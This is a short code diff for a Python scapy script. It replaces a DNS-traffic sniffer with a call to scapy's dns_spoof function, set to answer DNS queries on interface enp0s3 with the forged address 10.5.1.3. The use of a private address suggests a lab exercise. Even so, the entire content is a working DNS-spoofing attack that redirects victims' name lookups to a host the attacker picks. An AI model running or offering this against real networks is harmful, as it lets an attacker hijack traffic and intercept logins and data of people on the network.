@@ -1,8 +1,5 @@
-from scapy.all import DNS, DNSQR, IP, send, IPv6, sr, UDP, sniff, DNSRR, sendp, Ether, srp1, ARP
+from scapy.all import dns_spoof
 
 
-print(sniff(filter="udp dst port 53"))
-
-
-
+dns_spoof(iface="enp0s3", joker="10.5.1.3")
   
